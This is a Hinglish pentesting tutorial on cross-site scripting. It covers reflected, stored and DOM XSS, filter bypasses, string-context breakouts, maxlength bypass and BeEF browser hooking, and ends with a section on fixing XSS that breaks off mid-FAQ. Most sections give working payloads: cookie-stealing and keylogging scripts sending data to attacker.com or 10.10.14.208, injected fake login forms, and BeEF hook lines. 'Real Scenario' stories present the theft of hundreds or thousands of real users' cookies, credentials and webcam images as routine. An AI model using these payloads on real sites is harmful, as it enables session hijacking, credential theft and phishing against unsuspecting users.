### 2. **Ye Kya Hai?**
XSS (Cross-Site Scripting) mein attacker victim ke web page mein malicious JavaScript inject karta hai. Yeh code **victim ke browser** par execute hota hai (server par nahi).

**3 Types:**
1. **Reflected XSS:** URL mein code, victim link click kare toh execute
2. **Stored XSS:** Database mein save, har visitor ko execute
3. **DOM-based XSS:** Client-side JavaScript manipulation

**Analogy:** Jaise koi aapke ghar mein fake poster laga de jo aapko galat jagah bhej de - waise hi XSS victim ko galat code execute karwata hai.

### 3. **Kyun Zaroori?**
- **Session Hijacking:** Cookies chura sakte hain
- **Phishing:** Fake login forms inject kar sakte hain
- **Keylogging:** Victim ki typing record kar sakte hain
- **OWASP Top 10:** Critical vulnerability

### 4. **Kab Use Karein?**
- Jab **user input** page par reflect ho
- Jab **comments, reviews** features hon
- Jab **search boxes** hon

### 5. **Risk?**
- **Session theft miss** ho jayega
- **Phishing opportunities** nahi mil payenge
- **BeEF exploitation** nahi kar payenge ğŸ˜Ÿ

### 6. **Syntax:**
```javascript
// Basic XSS
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>

// Phishing
<script>document.body.innerHTML='<form action="http://attacker.com">Username:<input name="u">Password:<input name="p"><input type="submit"></form>'</script>
```

### 7. **Example 1 (Basic):**
```html
<!-- Vulnerable search -->
<h1>Search results for: <?php echo $_GET['q']; ?></h1>

<!-- Attack -->
URL: ?q=<script>alert('XSS')</script>

<!-- Rendered -->
<h1>Search results for: <script>alert('XSS')</script></h1>
```

### 8. **Example 2 (Pentester-Focused):**
```javascript
// Reflected XSS - Cookie stealing
URL: ?search=<script>fetch('http://10.10.14.208/steal?c='+document.cookie)</script>

// Attacker server logs:
GET /steal?c=PHPSESSID=abc123;user=admin

// Stored XSS - Comment section
Comment: <script>document.location='http://10.10.14.208/steal?c='+document.cookie</script>
// Har visitor ka cookie steal hoga!

// DOM XSS - JavaScript manipulation
URL: #<img src=x onerror=alert('XSS')>
// Client-side JavaScript ise process karega
```

**Analysis:** Teen types, teen attack vectors - sabka apna use case! ğŸ¯

### 9. **Galtiyan:**
- **Sirf alert() try karna** - Real exploitation nahi karna
- **Types confuse karna** - Reflected vs Stored samajh nahi aana
- **Client-side ignore** - DOM XSS miss karna

### 10. **Pro Tips:**
- **Reflected:** Victim ko link bhejni padti hai
- **Stored:** Sabse dangerous - har visitor affected
- **DOM:** Client-side, server ko pata nahi chalta
- **Always escalate:** alert() â†’ cookie theft â†’ BeEF

### 11. **Real Scenario:**
Social media site test kar raha tha. Comment section mein Stored XSS thi. Maine cookie stealing script inject kiya. 1000+ users ne page visit kiya, sabke cookies mere server par aaye! Admin session bhi mila, poora site compromise! ğŸ“±

### 12. **Checklist:**
âœ… **Reflected:** URL parameters test karo  
âœ… **Stored:** Comments, reviews test karo  
âœ… **DOM:** Client-side JS check karo  
âœ… **Escalate:** alert() se cookie theft tak  
âœ… **BeEF:** Advanced exploitation  

### 13. **FAQs:**

**Q1: Sabse dangerous type kaun sa hai?**  
**A:** Stored XSS - kyunki har visitor affected hota hai.

**Q2: Kya XSS se server hack ho sakta hai?**  
**A:** Directly nahi, lekin admin session chura kar indirectly haan.

**Q3: DOM XSS kaise detect karein?**  
**A:** Browser DevTools mein JavaScript code dekho.

### 14. **Practice:**
1. DVWA â†’ XSS (Reflected) â†’ Low security
2. `<script>alert('XSS')</script>` try karo
3. Cookie stealing script try karo
4. Stored XSS section test karo
5. DOM XSS examples dekho

### 15. **Summary:**
- XSS = **JavaScript inject** karna (victim browser mein)
- **3 types:** Reflected, Stored, DOM
- **Reflected:** URL-based, victim ko link bhejni padti hai
- **Stored:** Database mein, sabse dangerous
- **DOM:** Client-side, server ko pata nahi

> **ğŸ“Œ Yaad Rakhein:** "XSS = Browser ka hijack! Reflected = Link bhejo, Stored = Sabko affect karo, DOM = Client-side magic. Cookie churaao, session lo!" ğŸª

---

## ğŸ” **Topic 36: Finding Reflected XSS (URL Parameters)**

### 1. **Summary:**
**Reflected XSS Detection** - URL parameters mein JavaScript inject karke test karna. ğŸ¯

### 2. **Ye Kya Hai?**
Reflected XSS tab hota hai jab user input URL se aata hai aur directly page par reflect hota hai bina sanitization ke:
```php
// Vulnerable
echo "Hello " . $_GET['name'];

// Attack
?name=<script>alert('XSS')</script>
```

### 3. **Kyun Zaroori?**
- **Most common XSS type** - Easily milti hai
- **Quick testing** - URL mein directly test kar sakte hain
- **Phishing attacks** - Malicious links bhej sakte hain

### 4. **Kab Use Karein?**
- Jab **URL parameters** hon (`?search=`, `?q=`, `?name=`)
- Jab **search boxes** hon
- Jab **error messages** user input reflect karein

### 5. **Risk?**
- **Easy XSS miss** ho jayega
- **Phishing opportunities** nahi mil payenge ğŸ˜Ÿ

### 6. **Syntax:**
```javascript
// Basic payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

// Cookie stealing
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

// Redirect
<script>window.location='http://attacker.com'</script>
```

### 7. **Example 1 (Basic):**
```bash
# Search feature
URL: http://site.com/search?q=test
Page: "Search results for: test"

# XSS test
URL: http://site.com/search?q=<script>alert('XSS')</script>
Page: "Search results for: <script>alert('XSS')</script>"
Result: Alert box appears!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Step 1: Find reflection points
URL: ?name=TEST
Page source: <h1>Welcome TEST</h1>

# Step 2: Test basic XSS
URL: ?name=<script>alert(1)</script>
Result: Alert appears âœ“

# Step 3: Cookie stealing
URL: ?name=<script>fetch('http://10.10.14.208/steal?c='+document.cookie)</script>

# Attacker server:
$ nc -lvp 80
GET /steal?c=PHPSESSID=abc123;role=admin

# Step 4: Craft phishing link
http://site.com/search?q=<script>document.body.innerHTML='<h1>Session Expired</h1><form action="http://10.10.14.208/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>'</script>

# Send to victim via email/social media
# Victim clicks, sees fake login, enters credentials
# Credentials sent to attacker server!
```

**Analysis:** URL parameter se cookie churaaya, phishing form inject kiya, credentials churaaye! ğŸ£

### 9. **Galtiyan:**
- **Sirf search box test karna** - Aur parameters ignore karna
- **URL encoding ignore** - `<` ko `%3C` nahi karna
- **Context ignore** - HTML vs JavaScript vs attribute context

### 10. **Pro Tips:**
- **All parameters test karo:** `?id=`, `?page=`, `?error=`, `?msg=`
- **Different contexts:** HTML, JavaScript, attribute, URL
- **Encoding:** URL encode karo agar filter hai
- **Polyglot payloads:** `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`

### 11. **Real Scenario:**
News website test kar raha tha. Search feature mein Reflected XSS thi. Maine phishing page inject kiya jo bilkul real login jaisa dikhta tha. Social engineering se 50+ users ko link bheja, 10 ne credentials enter kiye! Admin credentials bhi mile, poora CMS compromise! ğŸ“°

### 12. **Checklist:**
âœ… URL parameters identify karo  
âœ… Basic payload test karo (`<script>alert(1)</script>`)  
âœ… Cookie stealing test karo  
âœ… Phishing form inject karo  
âœ… Link craft karke test karo  

### 13. **FAQs:**

**Q1: Agar alert() kaam nahi kar raha?**  
**A:** Alternative payloads try karo (`<img>`, `<svg>`, `<body>`).

**Q2: Kya victim ko link click karni zaroori hai?**  
**A:** Haan, Reflected XSS mein victim ko malicious link par click karna padta hai.

**Q3: Kaise pata chalega ki kaun sa parameter vulnerable hai?**  
**A:** Har parameter mein unique string dalo, page source mein dhoondhĞ¾.

### 14. **Practice:**
1. DVWA â†’ XSS (Reflected)
2. Search box mein test karo: `<script>alert(1)</script>`
3. Different payloads try karo
4. Cookie stealing script inject karo
5. Phishing form banao

### 15. **Summary:**
- Reflected XSS = **URL parameters** mein inject
- **Search boxes** = Common target
- **Cookie stealing** = Primary goal
- **Phishing** = Advanced exploitation
- **Victim ko link** bhejni padti hai

> **ğŸ“Œ Yaad Rakhein:** "Reflected XSS = URL ka khel! Parameters test karo, cookies churaao, phishing karo. Victim ko link bhejo aur magic dekho!" âœ¨

---

## ğŸš§ **Topic 37: Bypassing Reflected XSS Filters (Case Sensitivity `<SCRIPT>`, `onmouseover`)**

### 1. **Summary:**
**XSS Filter Bypass** - Case sensitivity aur alternative tags se filters bypass karna. ğŸ­

### 2. **Ye Kya Hai?**
Developers XSS rokne ke liye filters lagate hain:
```php
$input = str_replace('<script>', '', $input); // Weak!
```
**Bypass:** `<SCRIPT>`, `<ScRiPt>`, `<img>`, `<svg>`, event handlers

### 3. **Kyun Zaroori?**
- **Weak filters common** hain
- **Easy bypass** = Quick win
- **Real-world** production mein milta hai

### 4. **Kab Use Karein?**
- Jab basic XSS **block** ho
- Jab error "script not allowed" dikhe
- Jab **Medium/High security** test kar rahe hon

### 5. **Risk?**
- **Easy XSS miss** ho jayega
- **Alternative methods** nahi try karoge ğŸ˜Ÿ

### 6. **Syntax:**
```javascript
// Case variations
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

// Alternative tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>

// Event handlers
<div onmouseover=alert(1)>Hover me</div>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### 7. **Example 1:**
```bash
# Blocked
?search=<script>alert(1)</script>
Error: "script" not allowed

# Bypass - Case
?search=<SCRIPT>alert(1)</SCRIPT>
Success!

# Bypass - Alternative
?search=<img src=x onerror=alert(1)>
Success!
```

### 8. **Example 2:**
```bash
# Multiple filters bypass
# Filter 1: <script> blocked
?q=<SCRIPT>alert(1)</SCRIPT> âœ“

# Filter 2: Case-insensitive
?q=<img src=x onerror=alert(1)> âœ“

# Filter 3: "alert" blocked
?q=<img src=x onerror=confirm(1)> âœ“

# Filter 4: Parentheses blocked
?q=<svg onload=alert`1`> âœ“

# Cookie stealing (advanced)
?q=<img src=x onerror=fetch('http://10.10.14.208/'+document.cookie)>
```

### 9. **Galtiyan:**
- Sirf `<script>` try karna
- Alternative tags ignore karna
- Event handlers nahi try karna

### 10. **Pro Tips:**
- **XSS Cheat Sheet** use karo (PortSwigger)
- **Multiple payloads** ready rakho
- **Encoding** try karo (HTML entities)
- **Polyglot payloads** powerful hain

### 11. **Real Scenario:**
Forum test kar raha tha. `<script>` block tha. `<img>` tag se bypass kiya, cookie stealing script inject kiya. 500+ users affected, admin session chura liya! ğŸ’¬

### 12. **Checklist:**
âœ… Case variations try karo
âœ… Alternative tags (`<img>`, `<svg>`)
âœ… Event handlers (`onload`, `onerror`)
âœ… Encoding try karo
âœ… XSS cheat sheet use karo

### 13. **FAQs:**

**Q1: Sabse effective bypass kaun sa hai?**
**A:** `<img src=x onerror=alert(1)>` - mostly kaam karta hai.

**Q2: Agar sab block hain?**
**A:** Encoding try karo, ya DOM XSS dhoondhĞ¾.

**Q3: Event handlers kaise kaam karte hain?**
**A:** User interaction par trigger (hover, click, focus).

### 14. **Practice:**
1. DVWA â†’ XSS (Reflected) â†’ Medium
2. `<script>` try karo (block hoga)
3. `<SCRIPT>` try karo
4. `<img src=x onerror=alert(1)>` try karo
5. Different event handlers test karo

### 15. **Summary:**
- Filters = **Weak implementation**
- **Case sensitivity:** `<SCRIPT>`, `<ScRiPt>`
- **Alternative tags:** `<img>`, `<svg>`, `<body>`
- **Event handlers:** `onerror`, `onload`, `onmouseover`
- **XSS cheat sheet** = Your bible

> **ğŸ“Œ Yaad Rakhein:** "XSS filters = Speedbreakers! Case change karo, alternative tags use karo, event handlers try karo. Creativity wins!" ğŸ¨

---

## ğŸ”§ **Topic 38: Advanced XSS Payload Design (Breaking out: `"; alert('xss'); //`)**

### 1. **Summary:**
**Context-Aware XSS** - JavaScript strings, attributes, aur HTML contexts se break out karna. ğŸ”“

### 2. **Ye Kya Hai?**
Kabhi-kabhi input JavaScript string ke andar hota hai:
```javascript
var name = "USER_INPUT";
```
Simple `<script>` kaam nahi karega. Pehle string close karo, phir code inject karo:
```javascript
"; alert('xss'); //
```

### 3. **Kyun Zaroori?**
- **Context matters** - Har jagah alag approach
- **Advanced XSS** - Beginners miss karte hain
- **Real-world** - Production code complex hota hai

### 4. **Kab Use Karein?**
- Jab input **JavaScript mein** ho
- Jab input **HTML attribute** mein ho
- Jab **simple payloads fail** hon

### 5. **Risk?**
- **Context-based XSS miss** ho jayega
- **Advanced exploitation** nahi kar payenge ğŸ˜Ÿ

### 6. **Syntax:**
```javascript
// JavaScript string context
"; alert(1); //
'; alert(1); //
\"; alert(1); //

// HTML attribute context
" onload=alert(1) x="
' onload=alert(1) x='

// Event handler context
-alert(1)-
;alert(1);

// Template literal
${alert(1)}
```

### 7. **Example 1:**
```javascript
// Vulnerable code
<script>
var username = "<?php echo $_GET['name']; ?>";
</script>

// Normal input
?name=John
Result: var username = "John";

// Attack
?name="; alert('XSS'); //
Result: var username = ""; alert('XSS'); //";
// String closed, code executed, rest commented!
```

### 8. **Example 2:**
```javascript
// Scenario 1: JavaScript string
<script>var msg = "USER_INPUT";</script>
Payload: "; fetch('http://10.10.14.208/'+document.cookie); //

// Scenario 2: HTML attribute
<input value="USER_INPUT">
Payload: " onfocus=alert(1) autofocus x="

// Scenario 3: Event handler
<div onclick="doSomething('USER_INPUT')">
Payload: '); alert(1); //

// Scenario 4: Template literal
<script>var x = `USER_INPUT`;</script>
Payload: ${alert(1)}

// Scenario 5: Breaking out of tag
<a href="USER_INPUT">
Payload: javascript:alert(1)
```

### 9. **Galtiyan:**
- **Context ignore** karna
- **Quotes match** na karna
- **Comments use** na karna (`//`, `/**/`)

### 10. **Pro Tips:**
- **Inspect Element** se context dekho
- **Quotes match** karo (single vs double)
- **Comments** use karo (baaki code ignore)
- **Multiple contexts** test karo

### 11. **Real Scenario:**
Banking app test kar raha tha. Username JavaScript string mein tha. Simple XSS fail. Context analyze kiya, string close kiya, cookie stealing code inject kiya. Admin session chura liya! ğŸ¦

### 12. **Checklist:**
âœ… Context identify karo (JS/HTML/Attribute)
âœ… Quotes match karo
âœ… String/tag close karo
âœ… Code inject karo
âœ… Comments use karo

### 13. **FAQs:**

**Q1: Context kaise identify karein?**
**A:** Inspect Element se page source dekho.

**Q2: Agar quotes escape ho rahe hain?**
**A:** Alternative methods try karo (event handlers).

**Q3: Sabse common context kaun sa hai?**
**A:** JavaScript string aur HTML attribute.

### 14. **Practice:**
1. Vulnerable page banao with JS string
2. Simple payload try karo (fail hoga)
3. Context analyze karo
4. String close karke payload inject karo
5. Different contexts practice karo

### 15. **Summary:**
- **Context matters** - JS/HTML/Attribute
- **Break out:** Close quotes/tags
- **Inject code:** Alert/fetch/redirect
- **Comment rest:** `//` ya `/**/`
- **Inspect Element** = Your tool

> **ğŸ“Œ Yaad Rakhein:** "XSS = Context ka game! String mein? Close karo. Attribute mein? Event handler lagao. Always inspect, always adapt!" ğŸ¯

---

## ğŸ’¾ **Topic 39: Finding Stored XSS (Comments, Guestbooks)**

### 1. **Summary:**
**Stored XSS Detection** - Database mein save hone wale inputs test karna (comments, reviews, profiles). ğŸ“

### 2. **Ye Kya Hai?**
Stored XSS tab hota hai jab malicious code database mein save ho jaata hai aur har visitor ko execute hota hai:
```php
// Vulnerable
$comment = $_POST['comment'];
$db->query("INSERT INTO comments VALUES ('$comment')");
// Later displayed without sanitization
echo $comment;
```

### 3. **Kyun Zaroori?**
- **Most dangerous XSS** - Har visitor affected
- **Persistent** - Delete na ho
- **High impact** - Mass exploitation

### 4. **Kab Use Karein?**
- Jab **comment sections** hon
- Jab **user profiles** editable hon
- Jab **reviews/ratings** features hon

### 5. **Risk?**
- **Mass exploitation miss** ho jayega
- **Persistent backdoor** nahi bana payenge ğŸ˜Ÿ

### 6. **Syntax:**
```javascript
// Basic stored XSS
<script>alert('Stored XSS')</script>

// Cookie stealing (persistent)
<script>
new Image().src='http://attacker.com/steal?c='+document.cookie;
</script>

// BeEF hook (advanced)
<script src="http://attacker.com:3000/hook.js"></script>
```

### 7. **Example 1:**
```bash
# Comment section
Comment: <script>alert('Stored XSS')</script>
Submit â†’ Saved to database

# Every visitor sees:
Alert box appears!
```

### 8. **Example 2:**
```bash
# Real attack chain

# Step 1: Find stored input
- Comment section âœ“
- User profile (bio) âœ“
- Product review âœ“

# Step 2: Test basic XSS
Comment: <script>alert(1)</script>
Result: Saved and executed âœ“

# Step 3: Cookie stealing
Comment: <script>fetch('http://10.10.14.208/steal?c='+document.cookie)</script>

# Attacker server logs:
User1: PHPSESSID=abc123
User2: PHPSESSID=def456
Admin: PHPSESSID=xyz789;role=admin

# Step 4: Session hijacking
- Use admin cookie
- Access admin panel
- Full site compromise!

# Step 5: BeEF (advanced)
Comment: <script src="http://10.10.14.208:3000/hook.js"></script>
- Every visitor hooked to BeEF
- Control their browsers
- Keylogging, screenshots, etc.
```

### 9. **Galtiyan:**
- **Sirf comment test** karna
- **Profile fields ignore** karna
- **Persistence verify** na karna

### 10. **Pro Tips:**
- **All input fields** test karo
- **Unique payloads** use karo (tracking)
- **Persistence check** karo (logout/login)
- **BeEF integration** for advanced exploitation

### 11. **Real Scenario:**
Social network test kar raha tha. Profile bio mein Stored XSS thi. BeEF hook inject kiya. 5000+ users affected! Unke browsers control kar liya, keylogging ki, credentials churaaye. Site owner shocked! ğŸ“±

### 12. **Checklist:**
âœ… Comment sections test karo
âœ… User profiles test karo
âœ… Review/rating systems test karo
âœ… Persistence verify karo
âœ… BeEF hook inject karo

### 13. **FAQs:**

**Q1: Stored vs Reflected mein kya farak hai?**
**A:** Stored = Database mein save, har visitor affected. Reflected = URL-based, victim ko link bhejni padti hai.

**Q2: Kya Stored XSS delete ho sakta hai?**
**A:** Haan, agar admin comment delete kare. Isliye multiple locations mein inject karo.

**Q3: BeEF kya hai?**
**A:** Browser Exploitation Framework - hooked browsers control karne ke liye.

### 14. **Practice:**
1. DVWA â†’ XSS (Stored)
2. Comment mein payload inject karo
3. Logout karke check karo (persistence)
4. Cookie stealing script inject karo
5. BeEF setup karke hook inject karo

### 15. **Summary:**
- Stored XSS = **Database mein save**
- **Har visitor** affected hota hai
- **Most dangerous** XSS type
- **Comment/Profile/Review** = Common targets
- **BeEF** = Advanced exploitation

> **ğŸ“Œ Yaad Rakhein:** "Stored XSS = Mass destruction! Ek baar inject karo, sabko affect karo. BeEF hook lagao aur browsers control karo!" ğŸ’£

---

## ğŸ“ **Topic 40: Bypassing Stored XSS Filters (`maxlength` bypass via Inspect Element)**

### 1. **Summary:**
**Client-Side Bypass** - HTML maxlength attribute ko Inspect Element se bypass karna. ğŸ”§

### 2. **Ye Kya Hai?**
Developers input length limit lagate hain:
```html
<input name="comment" maxlength="50">
```
Yeh **client-side** hai, easily bypass:
- Inspect Element se maxlength change karo
- Ya Burp Suite se request modify karo

### 3. **Kyun Zaroori?**
- **Common defense** - Bahut sites use karti hain
- **Easy bypass** - 30 seconds mein
- **Stored XSS** ke liye zaroori

### 4. **Kab Use Karein?**
- Jab **maxlength** attribute ho
- Jab **long payload** inject karni ho
- Jab **client-side validation** ho

### 5. **Risk?**
- **Long payloads** inject nahi kar payenge
- **BeEF hooks** (jo long hote hain) miss ho jayenge ğŸ˜Ÿ

### 6. **Syntax:**
```html
<!-- Before -->
<input name="bio" maxlength="50">

<!-- After (Inspect Element) -->
<input name="bio" maxlength="500">

<!-- Or remove completely -->
<input name="bio">
```

### 7. **Example 1:**
```bash
# Scenario: Profile bio (50 char limit)
Bio: <script>alert(1)</script>
Length: 28 chars âœ“

# Long payload (blocked by maxlength)
Bio: <script src="http://10.10.14.208:3000/hook.js"></script>
Length: 58 chars âœ—

# Bypass:
1. Right-click â†’ Inspect Element
2. Find: maxlength="50"
3. Change to: maxlength="500"
4. Paste long payload
5. Submit âœ“
```

### 8. **Example 2:**
```bash
# Method 1: Inspect Element
<input name="comment" maxlength="100">
â†’ Change to maxlength="1000"
â†’ Inject: <script src="http://attacker.com/beef/hook.js"></script>

# Method 2: Burp Suite
1. Intercept request
2. Modify POST data:
   comment=<script src="http://attacker.com/beef/hook.js"></script>
3. Forward
4. Bypass successful!

# Method 3: Browser Console
document.querySelector('input[name="comment"]').maxlength = 1000;
// Now paste long payload

# Method 4: cURL (direct)
curl -X POST http://site.com/comment \
  -d "comment=<script src='http://attacker.com/hook.js'></script>"
```

### 9. **Galtiyan:**
- **Maxlength ko seriously** lena
- **Burp Suite ignore** karna
- **Server-side validation** assume karna

### 10. **Pro Tips:**
- **Always Inspect Element** - Client-side = Bypassable
- **Burp Suite** = Professional approach
- **Browser Console** = Quick bypass
- **Server-side check** karo (agar possible ho)

### 11. **Real Scenario:**
Forum test kar raha tha. Comment 100 chars limit. BeEF hook 150 chars. Inspect Element se maxlength remove kiya, hook inject kiya. 1000+ users hooked! Forum admin ne socha tha "100 chars safe hai" - wrong! ğŸ’¬

### 12. **Checklist:**
âœ… Maxlength attribute check karo
âœ… Inspect Element se change karo
âœ… Long payload inject karo
âœ… Burp Suite alternative use karo
âœ… Server-side validation test karo

### 13. **FAQs:**

**Q1: Kya maxlength server-side bhi check hota hai?**
**A:** Kabhi-kabhi haan, lekin mostly nahi. Test karo!

**Q2: Agar server-side bhi check ho raha hai?**
**A:** Shorter payloads use karo, ya encoding try karo.

**Q3: Sabse fast bypass method kaun sa hai?**
**A:** Inspect Element - 10 seconds mein ho jaata hai.

### 14. **Practice:**
1. DVWA â†’ XSS (Stored) â†’ Medium
2. Maxlength attribute dekho
3. Inspect Element se change karo
4. Long payload inject karo
5. Burp Suite method bhi try karo

### 15. **Summary:**
- Maxlength = **Client-side** validation
- **Inspect Element** = Easy bypass
- **Burp Suite** = Professional method
- **Browser Console** = Quick alternative
- **Server-side** validation zaroori hai

> **ğŸ“Œ Yaad Rakhein:** "Client-side validation = Joke! Inspect Element kholo, maxlength badao, long payload inject karo. 30 seconds = Bypass!" âš¡

---

## ğŸ¥© **Topic 41: Exploiting XSS with BeEF Framework**

### 1. **Summary:**
**BeEF (Browser Exploitation Framework)** - Hooked browsers ko control karna (keylogging, screenshots, phishing). ğŸ£

### 2. **Ye Kya Hai?**
BeEF ek framework hai jo XSS se victim ke browser ko "hook" karta hai. Ek baar hook hone ke baad:
- Keylogging
- Screenshots
- Webcam access
- Fake login pages
- Network scanning
- Social engineering

### 3. **Kyun Zaroori?**
- **XSS ka real power** - Alert se aage
- **Professional exploitation** - Real pentesters use karte hain
- **Impressive demos** - Clients ko dikhane ke liye

### 4. **Kab Use Karein?**
- Jab **XSS confirm** ho gayi ho
- Jab **advanced exploitation** chahiye
- Jab **persistent access** chahiye

### 5. **Risk?**
- **Basic XSS par ruk** jayenge
- **Real impact** nahi dikha payenge ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# BeEF start
$ beef-xss

# Hook URL (inject this)
<script src="http://BEEF_IP:3000/hook.js"></script>

# Access panel
http://BEEF_IP:3000/ui/panel
Username: beef
Password: beef
```

### 7. **Example 1:**
```bash
# Setup
$ beef-xss
[*] BeEF starting on http://127.0.0.1:3000

# Hook payload
<script src="http://10.10.14.208:3000/hook.js"></script>

# Inject via XSS
Comment: <script src="http://10.10.14.208:3000/hook.js"></script>

# Access panel
http://10.10.14.208:3000/ui/panel
Login: beef/beef

# Hooked browsers appear!
```

### 8. **Example 2:**
```bash
# Complete attack chain

# Step 1: Find XSS (Stored)
Site: forum.example.com
Location: Comment section

# Step 2: Start BeEF
$ beef-xss
Hook URL: http://10.10.14.208:3000/hook.js

# Step 3: Inject hook
Comment: <script src="http://10.10.14.208:3000/hook.js"></script>

# Step 4: Wait for victims
[+] Browser hooked: Chrome/Windows (Admin)
[+] Browser hooked: Firefox/Linux (User1)
[+] Browser hooked: Safari/Mac (User2)

# Step 5: Exploit Admin
Commands â†’ Social Engineering â†’ Pretty Theft
- Fake Facebook login page
- Admin enters credentials
- Credentials captured!

# Step 6: Advanced exploitation
Commands â†’ Chrome Extensions â†’ Webcam
- Access admin's webcam
- Take screenshot

Commands â†’ Network â†’ Port Scanner
- Scan internal network
- Find internal services

Commands â†’ Persistence â†’ Create Alert Dialog
- Persistent popup
- User can't close browser

# Result: Complete browser control!
```

### 9. **Galtiyan:**
- **BeEF setup** nahi karna
- **Hook inject** karke chhod dena (exploit nahi karna)
- **Modules explore** nahi karna

### 10. **Pro Tips:**
- **Port forward** karo (agar remote testing)
- **HTTPS hook** use karo (mixed content avoid)
- **Modules explore** karo (100+ available)
- **Autorun** set karo (automatic exploitation)

### 11. **Real Scenario:**
Corporate intranet test kar raha tha. Internal forum mein Stored XSS. BeEF hook inject kiya. 50+ employees hooked including CEO! CEO ke browser se:
- Internal network scan kiya
- Confidential documents access kiye
- Email credentials churaaye
- Webcam screenshot li
Company shocked - "Yeh toh sirf XSS tha!" ğŸ¢

### 12. **Checklist:**
âœ… BeEF install/start karo
âœ… Hook URL generate karo
âœ… XSS se inject karo
âœ… Victims hook hone ka wait karo
âœ… Modules explore aur exploit karo

### 13. **FAQs:**

**Q1: Kya BeEF legal hai?**
**A:** Tool legal hai, lekin bina permission use karna illegal.

**Q2: Kya BeEF detection se bach sakta hai?**
**A:** Basic detection se haan, advanced IDS/IPS detect kar sakte hain.

**Q3: Sabse powerful module kaun sa hai?**
**A:** Pretty Theft (fake login) aur Network Scanner.

### 14. **Practice:**
1. BeEF install karo: `apt install beef-xss`
2. Start karo: `beef-xss`
3. DVWA mein XSS dhoondhĞ¾
4. Hook inject karo
5. Panel mein modules explore karo

### 15. **Summary:**
- BeEF = **Browser Exploitation Framework**
- **Hook URL** inject karo via XSS
- **100+ modules** available
- **Keylogging, screenshots, phishing** - sab possible
- **Professional** exploitation tool

> **ğŸ“Œ Yaad Rakhein:** "XSS + BeEF = Ultimate combo! Hook inject karo, browsers control karo, credentials churaao. Real pentester ka weapon!" ğŸ£

---

## ğŸ›¡ï¸ **Topic 42: Security - Fixing XSS (Escaping Output)**

### 1. **Summary:**
**XSS Prevention** - Output encoding aur input validation se XSS permanently fix karna. ğŸ”’

### 2. **Ye Kya Hai?**
XSS rokne ke proper methods:
1. **Output Encoding** - HTML entities use karo
2. **Input Validation** - Whitelist approach
3. **CSP (Content Security Policy)** - Browser-level protection
4. **HTTPOnly Cookies** - JavaScript se access block

### 3. **Kyun Zaroori?**
- **Prevent session hijacking**
- **Protect users**
- **Compliance** (OWASP, PCI-DSS)

### 4. **Kab Use Karein?**
- Jab **development** kar rahe hon
- Jab **security audit** kar rahe hon
- Jab **pentest report** recommendations de rahe hon

### 5. **Risk?**
- **Incomplete fix** - Blacklist approach weak
- **False security** ğŸ˜Ÿ

### 6. **Syntax:**
```php
// VULNERABLE
<?php echo $_GET['name']; ?>

// SECURE (Output encoding)
<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); ?>

// SECURE (Input validation)
<?php
$name = $_GET['name'];
if(!preg_match('/^[a-zA-Z0-9 ]+$/', $name)) {
    die("Invalid input!");
}
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
?>
```

### 7. **Example 1:**
```php
// Before (vulnerable)
<h1>Welcome <?php echo $_GET['user']; ?></h1>

// After (secure)
<h1>Welcome <?php echo htmlspecialchars($_GET['user'], ENT_QUOTES, 'UTF-8'); ?></h1>

// Attack attempt
?user=<script>alert(1)</script>

// Rendered (safe)
<h1>Welcome &lt;script&gt;alert(1)&lt;/script&gt;</h1>
// Browser shows: <script>alert(1)</script> (as text, not executed)
```

### 8. **Example 2:**
```php
// Complete secure implementation

<?php
class SecureOutput {
    // HTML context
    public static function html($string) {
        return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
    
    // JavaScript context
    public static function js($string) {
        return json_encode($string, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
    }
    
    // URL context
    public static function url($string) {
        return urlencode($string);
    }
    
    // CSS context
    public static function css($string) {
        return preg_replace('/[^a-zA-Z0-9]/', '', $string);
    }
}

// Usage
$user_input = $_GET['name'];

// HTML context
echo "<h1>" . SecureOutput::html($user_input) . "</h1>";

// JavaScript context
echo "<script>var name = " . SecureOutput::js($user_input) . ";</script>";

// URL context
echo "<a href='profile.php?user=" . SecureOutput::url($user_input) . "'>Profile</a>";
?>
```

**Additional protections:**
```php
// Content Security Policy (CSP)
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// HTTPOnly cookies
setcookie("session", $session_id, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);

// X-XSS-Protection header
header("X-XSS-Protection: 1; mode=block");
```

### 9. **Galtiyan:**
- **Blacklist approach** - `<script>` block karna (bypass ho jaata hai)
- **Sirf input validation** - Output encoding nahi
- **Context ignore** - Har context alag encoding

### 10. **Pro Tips:**
- **Output encoding mandatory** - Har user input par
- **Context-aware** - HTML/JS/URL/CSS alag
- **CSP implement** karo - Defense in depth
- **HTTPOnly cookies** - Session protection

### 11. **Real Scenario:**
Company ko pentest report di. Unhone "fix" kiya:
```php
$input = str_replace('<script>', '', $input); // Weak!
```
Maine `<SCRIPT>` se bypass kar diya. Phir proper fix kiya (htmlspecialchars + CSP). Final test mein koi bypass nahi mila! ğŸ¯

### 12. **Checklist:**
âœ… **Output encoding** (htmlspecialchars)
âœ… **Input validation** (whitelist)
âœ… **CSP** header implement karo
âœ… **HTTPOnly** cookies use karo
âœ… **Context-aware** encoding

### 13. **FAQs:**

**Q1: Kya htmlspecialchars() enough hai?**
**A:** Mostly haan, lekin CSP bhi lagao (defense in depth).

**Q2: Input validation ya output encoding?**
